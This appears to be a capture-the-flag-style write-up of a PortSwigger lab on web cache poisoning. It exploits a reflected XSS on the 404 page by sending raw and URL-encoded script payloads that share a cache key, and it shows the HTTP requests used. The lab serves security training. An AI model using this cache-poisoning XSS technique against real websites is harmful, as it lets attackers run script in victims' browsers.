
# URL normalization

This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.

To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute alert(1) in the victim's browser. Then, deliver the malicious URL to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws



![img](images/URL%20normalization/1.png)

---------------------------------------------

We can find the “Origin” header can work as oracle and random query parameters are keyed:

```
GET /?test=ing123 HTTP/2
...
Pragma: x-get-cache-key
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: cachebuster.0ad0007f043013aa819c0d3d003a00ce.web-security-academy.net
```



![img](images/URL%20normalization/2.png)


There is a reflected XSS when the page is not found:

```
GET /404<script>alert(1)</script>
```



![img](images/URL%20normalization/3.png)




![img](images/URL%20normalization/4.png)


The cache key is the same for:

- /<script>alert(1)</script>
- /%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e (URL-encode all characters)





![img](images/URL%20normalization/5.png)
![img](images/URL%20normalization/6.png)



First I will send the unencoded version until hitting the cache limit and then the encoded one:



![img](images/URL%20normalization/7.png)

We see the correct payload:



![img](images/URL%20normalization/8.png)

Next, the same test without the “Origin” header:





![img](images/URL%20normalization/9.png)
![img](images/URL%20normalization/10.png)


If we visit “/%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e”:



![img](images/URL%20normalization/11.png)


To solve the lab it is necessary to add something random before the payload:

```
GET /random<script>alert(1)</script>
```

```
GET /random%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
```